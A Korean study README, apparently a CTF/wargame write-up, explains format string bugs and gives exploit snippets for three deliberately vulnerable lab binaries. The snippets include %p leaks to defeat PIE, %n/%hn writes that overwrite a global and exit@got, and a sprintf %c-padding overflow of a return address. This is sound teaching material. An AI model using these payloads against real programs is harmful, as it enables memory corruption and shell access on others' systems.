# formatstring (Format String Bug)

`printf(user_input)` 처럼 사용자 입력을 포맷 문자열로 직접 넘겨 발생하는 취약점. 이 폴더에는 세 가지 변형이 있다.

## FSB 기본

- `%p`, `%x`, `%s` : 스택/지정 주소를 **읽기**(릭). `%N$p`로 N번째 인자를 바로 지정.
- `%n` : **지금까지 출력된 문자 수**를 해당 인자가 가리키는 주소에 **쓴다**. `%hn`(2바이트), `%hhn`(1바이트)로 크기 조절.
- `%<width>c` : width 만큼 문자를 출력해 카운트를 원하는 값으로 맞춘 뒤 `%n`으로 기록 → **임의 주소에 임의 값 쓰기**.

x86-64는 처음 인자 일부가 레지스터에 실려 스택 인덱스가 어긋나므로, `%N$p`의 N을 실측으로 찾는다.

---

## 1) `fsb_overwrite` (x86-64, PIE)

```c
int changeme;
int main() {
  char buf[0x20];
  while (1) {
    get_string(buf, 0x20);
    printf(buf);                 // FSB
    if (changeme == 1337) system("/bin/sh");
  }
}
```

전역 변수 `changeme`를 `1337`로 만들면 셸. PIE라 먼저 코드 주소를 릭해야 한다.

```python
# [1] 코드 주소 릭 → PIE base
p.sendline(b'%15$p')
code_base = int(leak, 16) - 0x1293
changeme  = code_base + elf.symbols['changeme']

# [2] changeme = 1337 쓰기
payload  = b'%1337c'      # 출력 문자 수를 1337로
payload += b'%8$n'        # 8번째 인자(=아래 배치한 주소)에 1337 기록
payload += b'A'*6         # 8바이트 정렬 패딩
payload += p64(changeme)  # %8$n이 가리킬 주소
```

- 반복 루프이므로 릭과 쓰기를 나눠 두 번 입력할 수 있다.
- `%8$n`의 인덱스 8이 페이로드 뒤에 놓은 `changeme` 주소를 가리키도록 패딩으로 정렬.

---

## 2) `basic_exploitation_002` (x86)

```c
void get_shell() { system("/bin/sh"); }
int main() {
  char buf[0x80];
  read(0, buf, 0x80);
  printf(buf);              // FSB
  exit(0);
}
```

`exit`가 곧 호출되므로 **`exit@got`를 `get_shell`로 덮는다**.

```python
under = int.from_bytes(p32(e.symbols['get_shell'])[:2], "little")  # 하위 2바이트
payload  = f"%{under}c".encode()   # 출력 수를 get_shell 하위 2바이트로
payload += b"%5$hn"                # 5번째 인자 주소에 2바이트 기록
payload += b"a" * (16 - len(payload))
payload += p32(exit_got)           # %5$hn 대상 = exit@got
```

- `%hn`으로 **하위 2바이트만** 덮어 `get_shell` 주소로 만든다(상위 바이트는 원래 값과 거의 같음).
- 이후 `exit()` 호출 → 실제로는 `get_shell()` 실행.

---

## 3) `basic_exploitation_003` (x86, `sprintf` BOF)

```c
int main() {
  char *heap_buf = malloc(0x80);
  char stack_buf[0x90] = {};
  read(0, heap_buf, 0x80);
  sprintf(stack_buf, heap_buf);   // 포맷 문자열 → 길이 제한 없는 스택 쓰기
  printf("ECHO : %s\n", stack_buf);
}
```

여기서는 `%n` 대신 **`%c` 패딩으로 문자열 길이를 부풀려 `sprintf`가 `stack_buf`를 넘치게** 만든다. `sprintf`는 경계 검사가 없으므로 사실상 BOF.

```python
l = 0x98 + 0x4                     # stack_buf 채우고 SFP까지 지나 RET 위치
payload  = f"%{l}c".encode()       # 0x9c 개 문자 출력 → 스택 채움
payload += p32(get_shell)          # RET를 get_shell로 덮음
```

- `%<l>c`가 `stack_buf`부터 리턴 주소 직전까지 정확히 채우고, 이어진 `p32(get_shell)`가 반환 주소를 덮는다.
- FSB를 **읽기/쓰기 primitive가 아니라 “길이 제어를 통한 오버플로우”** 로 활용한 사례.

## 핵심 개념 정리

- `%n` 계열은 **출력된 누적 문자 수**를 쓴다 → `%c` width로 값 제어.
- 릭(`%p`)으로 PIE/libc/스택 우회, 쓰기(`%n`)로 GOT·전역변수·리턴주소 변조.
- `sprintf`/`vsprintf` 처럼 길이 제한 없는 함수에 포맷 버그가 겹치면 BOF로도 이어진다.
